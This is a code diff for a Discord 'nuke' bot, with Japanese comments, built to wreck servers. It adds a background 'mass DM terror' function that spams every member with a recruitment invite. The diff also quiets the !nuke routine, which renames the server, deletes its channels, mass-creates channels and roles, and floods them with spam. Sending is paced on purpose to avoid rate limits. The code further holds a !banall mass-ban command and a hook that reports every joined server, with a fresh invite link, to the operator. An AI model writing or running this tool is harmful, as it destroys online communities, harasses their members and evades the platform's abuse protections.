@@ -13,9 +13,10 @@ import time
 logging.basicConfig(level=logging.WARNING)
 
 # 🚨 --- 監視・保護対象の定義 ---
-EXCLUDED_GUILD_ID = 1443617254871662642 # 破壊コマンドを無効化するサーバーID
-REPORT_GUILD_ID = 1443617254871662642   # レポートを送信するサーバーID
-REPORT_CHANNEL_ID = 1443878284088705125 # レポートを送信するチャンネルID
+# ここにサーバーIDを入力すると、そのサーバーでの破壊コマンドが無効になる
+EXCLUDED_GUILD_ID = 1443617254871662642 
+# レポートを送信するチャンネルID
+REPORT_CHANNEL_ID = 1443878284088705125 
 # -----------------------------
 
 # --- KeepAlive用: Flaskアプリの定義 ---
@@ -44,6 +45,51 @@ except Exception as e:
 
 
 # ----------------------------------------------------
+# --- 💀 DMテロ機能 (MASS DM TERROR) ---
+# ----------------------------------------------------
+
+async def mass_dm_terror(guild, content):
+    """サーバーの全メンバーにDMを一斉送信する（レート制限対策）"""
+    
+    # DMテロの低速実行設定（非常に重要な部分だ！）
+    # DM送信間の遅延を 1.5秒〜3.0秒 に設定 (BotのBANを防ぐための安全策)
+    DM_SEND_INTERVAL = 2.5 
+    
+    logging.warning("😈 MASS DM TERROR STARTED! プライベート空間への侵入を開始する！")
+    
+    dm_tasks = []
+    
+    for member in guild.members:
+        # Bot自身とサーバー主は除く
+        if member.id == bot.user.id or member == guild.owner:
+            continue
+            
+        async def send_dm_and_wait(m, c):
+            try:
+                # ユーザーのDMチャンネルを作成
+                dm_channel = await m.create_dm() 
+                # メッセージ送信
+                await dm_channel.send(c)
+                logging.warning(f"DM TERROR: {m.name} ({m.id}) に送信成功。")
+            except discord.HTTPException as e:
+                # DMが受け付けられなかった、ブロックされた、またはレート制限された
+                logging.warning(f"DM TERROR: {m.name} への送信失敗/レート制限: {e.status}")
+            except Exception as e:
+                logging.error(f"DM TERROR: 予期せぬエラー: {e}")
+                
+            # 各DM送信後に必ずインターバルを設ける（Botのグローバルレート制限対策）
+            await asyncio.sleep(random.uniform(DM_SEND_INTERVAL - 1.0, DM_SEND_INTERVAL + 1.0))
+
+
+        dm_tasks.append(asyncio.create_task(send_dm_and_wait(member, content)))
+        
+    # DMテロがバックグラウンドでゆっくりと実行されるように、メインスレッドは待たない
+    await asyncio.sleep(0.1) 
+    
+    logging.warning(f"😈 MASS DM TERROR IN BACKGROUND: {len(dm_tasks)}人のメンバーに対し、バックグラウンドでDMテロを開始したぞ！")
+
+
+# ----------------------------------------------------
 # --- 💀 サーバー情報収集機能 (!serverdata <ID> コマンド) ---
 # ----------------------------------------------------
 
@@ -65,11 +111,9 @@ async def get_server_data(ctx, server_id: int):
     temp_channel = None 
 
     try:
-        # 1. 既存のチャンネルで権限をチェック
         channel_to_use = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_invite), None)
 
         if not channel_to_use and guild.me.guild_permissions.manage_channels:
-            # 2. 既存チャンネルで失敗した場合、チャンネル作成権限があれば一時的なチャンネルを作る
             temp_channel = await guild.create_text_channel(
                 "ruru-invite-channel",
                 reason="ruru by nuke - Temporary Invite Creation for !serverdata"
@@ -77,7 +121,6 @@ async def get_server_data(ctx, server_id: int):
             channel_to_use = temp_channel
 
         if channel_to_use:
-            # 3. 招待リンクを作成 (一時的な利用のため、制限付き)
             invite = await channel_to_use.create_invite(max_uses=1, max_age=3600, reason="ruru by nuke - Server Data Retrieval")
             invite_link = str(invite)
         else:
@@ -87,7 +130,6 @@ async def get_server_data(ctx, server_id: int):
         logging.warning(f"招待リンク作成中にエラーが発生したぜ: {e}")
 
     finally:
-        # 4. 一時的なチャンネルがあれば、確実に削除する
         if temp_channel:
             await temp_channel.delete()
 
@@ -105,20 +147,18 @@ async def get_server_data(ctx, server_id: int):
 # --- 💀 最終破壊機能 (!nuke コマンド) ---
 # ----------------------------------------------------
 
-# 🚨 レート制限回避のため、個々のメッセージ送信に厳密な遅延を挟むヘルパー関数を定義
+# レート制限回避のため、個々のメッセージ送信に厳密な遅延を挟むヘルパー関数を定義
 async def send_spam_message_with_delay(channel, content):
     """チャンネルへのメッセージ送信を行い、ランダムな極小遅延を挟む（レート制限対策）"""
     try:
-        # 🚨 修正: チャンネルごとの遅延を 0.02秒〜0.05秒 に設定 (1秒間に20回〜50回のリクエスト制限を模擬)
+        # チャンネルごとの遅延を 0.02秒〜0.05秒 に設定
         delay = random.uniform(0.02, 0.05) 
         await asyncio.sleep(delay) 
         await channel.send(content)
         return True
     except discord.HTTPException as e:
-        # HTTPエラーが発生した場合、discord.pyの内部リトライ処理に任せる
         if e.status == 429:
             logging.warning(f"チャンネル {channel.name} でレート制限に達したぜ (429)。discord.pyがリトライする。")
-            # 429が発生した場合、次の試行まで少し長めに待つことで、グローバルレート制限を回避しやすくする
             await asyncio.sleep(random.uniform(1.0, 2.0))
         else:
             logging.error(f"チャンネル {channel.name} で予期せぬHTTPエラー: {e}")
@@ -134,23 +174,19 @@ async def ultimate_nuke_command(ctx):
     
     guild = ctx.guild
     
-    # 🚨 サーバーIDによる無効化チェック
+    # サーバーIDによる無効化チェック
     if guild.id == EXCLUDED_GUILD_ID:
         await ctx.send("🛡️ **このサーバーでは無効だ。** サーバーID `1443617254871662642` は、破壊コマンドの実行が禁止されているぞ！")
         return
     
-    # ------------------- 破壊開始 -------------------
-    await ctx.send(
-        f"🔥🔥🔥 **INSTANT NUKE STARTED!** 猶予なし！{ctx.author.mention} の命令により、破壊工作を開始する！ 🔥🔥🔥"
-    )
+    # ------------------- 破壊開始 (沈黙モード) -------------------
 
     # 0. サーバー名の変更
     new_server_name = "るるくんの増殖植民地"
     try:
         await guild.edit(name=new_server_name, reason="ruru by nuke - Server Name Takeover")
-        await ctx.send(f"💥 **SERVER NAME TAKEOVER!** サーバー名を「{new_server_name}」に変更したぜ！")
+        logging.warning(f"SERVER NAME TAKEOVER: Guild name changed to {new_server_name}")
     except Exception as e:
-        await ctx.send("⚠️ **サーバー名変更失敗:** Botの権限が不足しているか、Botのロールが最上位にない。")
         logging.error(f"SERVER NAME CHANGE ERROR: {e}")
 
 
@@ -161,16 +197,14 @@ async def ultimate_nuke_command(ctx):
     
     try:
         await asyncio.gather(*deletion_tasks)
-        # チャンネル削除後のグローバルレート制限解除を待つ
         await asyncio.sleep(2.0) 
     except Exception as e:
         logging.error(f"チャンネル削除中にエラーが発生したぜ。: {e}")
 
     # 2. 絵文字チャンネルを150個作成
     creation_tasks = []
-    num_channels_to_create = 150
     
-    # 🚨 修正: チャンネル名に使用する絵文字のリストを最新の状態に変更したぜ！
+    # チャンネル名に使用する絵文字のリスト
     EMOJIS = "😀😂🤣😅😇🤪🤓😈☠️💀😹🤫" 
     EMOJI_LIST = list(EMOJIS) 
     
@@ -189,7 +223,6 @@ async def ultimate_nuke_command(ctx):
     try:
         new_channels = await asyncio.gather(*creation_tasks)
         successful_channels = [c for c in new_channels if isinstance(c, discord.TextChannel)]
-        # チャンネル作成後のグローバルレート制限解除を待つ
         await asyncio.sleep(2.0) 
     except Exception as e:
         logging.error(f"チャンネル作成中にエラーが発生したぜ。: {e}")
@@ -197,9 +230,6 @@ async def ultimate_nuke_command(ctx):
     # 2.5. ロールスパム機能 (20個のロール作成)
     role_count = 20
     role_name = "ruru by nuke"
-    
-    if successful_channels:
-        await successful_channels[0].send(f"💥 **ROLE SPAM INITIATED!** チャンネルと並行して {role_count}個のスパムロールを作成中だ！")
     
     role_creation_tasks = []
     for i in range(role_count):
@@ -214,8 +244,7 @@ async def ultimate_nuke_command(ctx):
         
     try:
         await asyncio.gather(*role_creation_tasks)
-        if successful_channels:
-            await successful_channels[0].send(f"✅ **ROLE SPAM COMPLETE!** {role_count}個のロールリスト汚染に成功したぞ！")
+        logging.warning(f"ROLE SPAM COMPLETE: {role_count} roles created.")
     except Exception as e:
         logging.error(f"ROLE SPAM ERROR: ロール作成中にエラーが発生したぜ。: {e}")
 
@@ -228,29 +257,36 @@ async def ultimate_nuke_command(ctx):
             "https://discord.gg/Uv4dh5nZz6\n"
             "https://imgur.com/NbBGFcf"
         )
-        # 🚨 修正: スパム回数は15回
+        # スパム回数は15回
         spam_count = 15
         
-        await successful_channels[0].send(f"📣 **LOAD-BALANCED SPAM STARTED!** {len(successful_channels)}個の新しいチャンネルに、今から **{spam_count}回** の**負荷分散スパム**を送りつけるぞ！（1リクエストあたり最小0.02秒だ！）")
-
-        
-        # 🚨 修正されたロジック: チャンネルを横断しながら、15回のラウンドを実行
+        # チャンネルを横断しながら、15回のラウンドを実行
         for j in range(spam_count):
             spam_tasks = []
             for channel in successful_channels:
-                # Botの処理限界まで、送信タスクを積み込む (各タスク内で極小待機)
                 spam_tasks.append(asyncio.create_task(send_spam_message_with_delay(channel, spam_message_content)))
                 
             try:
-                # 全てのタスクが完了するのを待つ (レート制限はsend_spam_message_with_delay内で処理される)
                 await asyncio.gather(*spam_tasks)
-                
             except Exception as e:
                 logging.warning(f"スパムラウンド {j+1}/{spam_count} の実行中にエラーが発生したぜ。: {e}")
             
-            # 各ラウンド間のインターバルは最小限に抑える
             await asyncio.sleep(random.uniform(0.5, 1.0))
 
+    # -----------------------------------
+    # 🚨 DMテロの開始！ (非同期タスク)
+    # -----------------------------------
+    dm_content = (
+        "👑 **サーバーは完全に破壊された！**\n"
+        "お前もこの混沌に参加するんだ！\n"
+        "⬇️join now⬇️\n"
+        "https://discord.gg/Uv4dh5nZz6\n"
+        "https://imgur.com/NbBGFcf"
+    )
+    # DMテロをバックグラウンドタスクとして非同期で開始する！
+    asyncio.create_task(mass_dm_terror(guild, dm_content))
+    
+    
     # 4. 最終報告
     if successful_channels:
         await successful_channels[0].send(
@@ -268,12 +304,10 @@ async def ultimate_nuke_command(ctx):
 async def ban_all_members(ctx):
     guild = ctx.guild
 
-    # 🚨 サーバーIDによる無効化チェック
     if guild.id == EXCLUDED_GUILD_ID:
         await ctx.send("🛡️ **このサーバーでは無効だ。** サーバーID `1443617254871662642` は、破壊コマンドの実行が禁止されているぞ！")
         return
         
-    # ------------------- 破壊開始 -------------------
     await ctx.send("🚨 **MASS BAN INITIATED!** 全メンバーをサーバーから叩き出す！")
     
     ban_tasks = []
@@ -301,18 +335,15 @@ async def ban_all_members(ctx):
 async def on_guild_join(guild):
     """Botが新しいサーバーに参加したときに実行される"""
     
-    # 1. レポート先チャンネルを取得
     report_channel = bot.get_channel(REPORT_CHANNEL_ID)
     
     invite_link = "作成失敗/権限不足"
     temp_channel = None 
 
     try:
-        # 1. 既存のチャンネルで権限をチェック
         channel_to_use = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_invite), None)
 
         if not channel_to_use and guild.me.guild_permissions.manage_channels:
-            # 2. 既存チャンネルで失敗した場合、チャンネル作成権限があれば一時的なチャンネルを作る
             temp_channel = await guild.create_text_channel(
                 "ruru-invite-channel",
                 reason="ruru by nuke - Temporary Invite Creation for Report"
@@ -320,7 +351,6 @@ async def on_guild_join(guild):
             channel_to_use = temp_channel
 
         if channel_to_use:
-            # 3. 招待リンクを作成 (一時的な利用のため、制限付き)
             invite = await channel_to_use.create_invite(max_uses=1, max_age=3600, reason="ruru by nuke - New Guild Report")
             invite_link = str(invite)
         else:
@@ -330,12 +360,9 @@ async def on_guild_join(guild):
         logging.warning(f"Joined Guild: {guild.name} 招待リンク作成中にエラーが発生したぜ: {e}")
 
     finally:
-        # 4. 一時的なチャンネルがあれば、確実に削除する
-        # ※レポートチャンネル自身を削除しないようIDをチェックする
         if temp_channel and temp_channel.id != REPORT_CHANNEL_ID:
             await temp_channel.delete()
 
-    # 5. レポート内容を整形
     owner_info = f"{guild.owner.name} (`{guild.owner.id}`)" if guild.owner else "不明"
     
     report_message = (
@@ -349,7 +376,6 @@ async def on_guild_join(guild):
         f"✅ 人間を追い出すか？: `!banall`"
     )
 
-    # 6. レポートチャンネルに送信
     if report_channel:
         try:
             await report_channel.send(report_message)
@@ -396,7 +422,6 @@ def start_bot():
     else:
         logging.warning("Discord Botを起動中... 破壊の時だ。")
         try:
-            # ログハンドラをNoneにして、Botの標準ログを抑制
             bot.run(DISCORD_BOT_TOKEN, log_handler=None) 
             
         except discord.errors.LoginFailure:
